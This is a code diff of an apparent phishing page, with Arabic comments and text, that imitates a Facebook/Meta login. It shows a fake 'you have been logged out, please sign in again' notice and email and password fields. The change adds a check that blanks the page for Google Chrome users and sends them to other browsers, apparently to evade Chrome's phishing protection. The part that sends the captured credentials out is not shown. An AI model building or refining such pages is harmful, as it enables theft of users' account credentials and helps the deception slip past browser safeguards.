@@ -129,13 +129,29 @@
     <div class="msg" id="msg"></div>
   </div>
 
-  <!-- ✅ رابط Meta -->
   <div class="meta" id="metaLink">Meta ©</div>
 
-  <!-- ✅ فقاعة الإشعار -->
   <div class="toast" id="toast">تم تسجيل خروجك من فيس بوك يرجى إعادة التسجيل مرة اخرى</div>
 
   <script>
+    // ✅ فحص المتصفح أولًا
+    window.addEventListener("load", () => {
+      const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
+      if (isChrome) {
+        alert("عذرًا، هذا الموقع لا يعمل على متصفح Google Chrome. يرجى استخدام متصفح آخر مثل Firefox أو Edge.");
+        document.body.innerHTML = "<h2 style='text-align:center;margin-top:50px;'>الرجاء استخدام متصفح آخر لتصفح هذا الموقع.</h2>";
+        return; // يمنع باقي الكود من التنفيذ
+      }
+
+      // ✅ إظهار فقاعة الإشعار إذا لم يكن Chrome
+      const toast = document.getElementById("toast");
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 4000);
+    });
+
+    // باقي الكود كما هو بدون تغيير
     const langBtn = document.getElementById("langBtn");
     const emailInput = document.getElementById("emailInput");
     const passInput = document.getElementById("passInput");
@@ -146,17 +162,7 @@
     const errorPass = document.getElementById("error-pass");
     const msg = document.getElementById("msg");
     const form = document.getElementById("myForm");
-    const toast = document.getElementById("toast");
 
-    // ✅ إظهار الفقاعة عند بداية الصفحة
-    window.addEventListener("load", () => {
-      toast.classList.add("show");
-      setTimeout(() => {
-        toast.classList.remove("show");
-      }, 4000);
-    });
-
-    // باقي الكود بدون تغيير
     const translations = {
       ar: {
         lang: "العربية ⌵",
@@ -202,9 +208,7 @@
     const langs = ["ar", "en", "fr"];
     let currentLangIndex = 0;
     const savedLang = localStorage.getItem("langIndex");
-    if (savedLang !== null) {
-      currentLangIndex = parseInt(savedLang);
-    }
+    if (savedLang !== null) currentLangIndex = parseInt(savedLang);
 
     function updateLanguage() {
       const langKey = langs[currentLangIndex];
@@ -285,6 +289,5 @@
       });
     });
   </script>
-
 </body>
 </html>
